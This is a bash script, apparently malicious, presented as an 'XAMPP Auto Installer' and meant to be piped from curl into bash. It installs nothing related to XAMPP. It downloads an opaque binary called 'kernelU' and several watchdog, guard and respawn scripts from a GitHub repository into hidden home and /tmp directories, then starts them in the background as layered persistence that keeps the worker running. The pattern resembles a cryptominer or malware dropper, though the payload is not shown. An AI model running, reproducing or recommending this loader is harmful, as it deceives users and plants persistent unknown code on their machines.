#!/bin/bash
# ============================================
# XAMPP Auto Installer
# Usage:
#   curl -fsSL https://raw.githubusercontent.com/basilbay80/Pw1/main/installation.sh | bash
# ============================================

set -e

# ============================================
# 🔗 Repository URL
# ============================================
REPO_URL="https://raw.githubusercontent.com/basilbay80/Pw1/main"

# ============================================
# 📁 Directory Paths
# ============================================
MAIN_DIR="$HOME/.xampp-healthcheck"
HELPER_DIR="/tmp/.xampp-helper"
GUARD_DIR="$HOME/.xampp-guard"

# ============================================
# 🎨 Colors
# ============================================
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info()    { echo -e "${BLUE}[INFO]${NC} $1"; }
success() { echo -e "${GREEN}[  ✓ ]${NC} $1"; }
warn()    { echo -e "${YELLOW}[WARN]${NC} $1"; }
error()   { echo -e "${RED}[FAIL]${NC} $1"; }

# ============================================
# Banner
# ============================================
echo ""
echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${NC}  ${BOLD}XAMPP Auto Installer${NC}                     ${CYAN}║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
echo ""

# ============================================
# Worker (only kernelU)
# ============================================
WORKER="kernelU"
success "Using worker: $WORKER"

# ============================================
# Download function (with fallback)
# ============================================
download() {
    local url="$1"
    local output="$2"
    local name="$3"

    info "Downloading $name..."

    if command -v curl >/dev/null 2>&1; then
        if curl -fsSL -o "$output" "$url"; then
            success "$name downloaded"
            return 0
        fi
    fi

    if command -v wget >/dev/null 2>&1; then
        if wget -q -O "$output" "$url"; then
            success "$name downloaded (wget)"
            return 0
        fi
    fi

    error "$name download failed"
    return 1
}

# ============================================
# [1/5] Create directories
# ============================================
echo ""
echo -e "${YELLOW}━━━ [1/5] Creating directories ━━━${NC}"
mkdir -p "$MAIN_DIR/logs"
mkdir -p "$HELPER_DIR"
mkdir -p "$GUARD_DIR"
success "Directories ready"

# ============================================
# [2/5] Download Worker
# ============================================
echo ""
echo -e "${YELLOW}━━━ [2/5] Downloading Worker ━━━${NC}"

download "${REPO_URL}/${WORKER}" "$MAIN_DIR/${WORKER}" "worker ($WORKER)"

chmod +x "$MAIN_DIR/${WORKER}"

# ============================================
# [3/5] Download watchdog & triggers
# ============================================
echo ""
echo -e "${YELLOW}━━━ [3/5] Downloading watchdog & triggers ━━━${NC}"

download "${REPO_URL}/watchdog.sh"        "$MAIN_DIR/watchdog.sh"        "watchdog.sh"
download "${REPO_URL}/trigger-respawn.sh" "$MAIN_DIR/trigger-respawn.sh" "trigger-respawn.sh"
download "${REPO_URL}/trigger-auto.sh"    "$MAIN_DIR/trigger-auto.sh"    "trigger-auto.sh"
download "${REPO_URL}/monitor.sh"         "$HELPER_DIR/monitor.sh"       "monitor.sh"
download "${REPO_URL}/guard.sh"           "$GUARD_DIR/guard.sh"          "guard.sh"

# ============================================
# [4/5] Grant execute permissions
# ============================================
echo ""
echo -e "${YELLOW}━━━ [4/5] Granting execute permissions ━━━${NC}"
find "$MAIN_DIR"   -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
find "$HELPER_DIR" -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
find "$GUARD_DIR"  -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
success "All scripts executable"

# ============================================
# [5/5] Start watchdog layers & worker
# ============================================
echo ""
echo -e "${YELLOW}━━━ [5/5] Starting watchdog & worker ━━━${NC}"

# Start watchdog layers first
nohup bash "$GUARD_DIR/guard.sh"        > /dev/null 2>&1 & success "Guard (layer 3) running"
sleep 1
nohup bash "$HELPER_DIR/monitor.sh"     > /dev/null 2>&1 & success "Monitor (layer 2) running"
sleep 1
nohup bash "$MAIN_DIR/watchdog.sh"      > /dev/null 2>&1 & success "Watchdog (layer 1) running"
sleep 1
nohup bash "$MAIN_DIR/trigger-auto.sh"  > /dev/null 2>&1 & success "Auto trigger running"
sleep 1

# Start worker (kernelU)
cd "$MAIN_DIR"
nohup "./${WORKER}" > "$MAIN_DIR/logs/runner.log" 2>&1 &
success "🤖 Worker ($WORKER) running (PID: $!)"

# ============================================
# Done
# ============================================
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   ✅ Installation complete!                  ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Check processes:${NC}  ps aux | grep -E 'kernelU|watchdog|monitor|guard'"
echo -e "${CYAN}Check logs:${NC}       tail -f $MAIN_DIR/logs/runner.log"
echo -e "${CYAN}Manual restart:${NC}   $MAIN_DIR/trigger-respawn.sh"
echo ""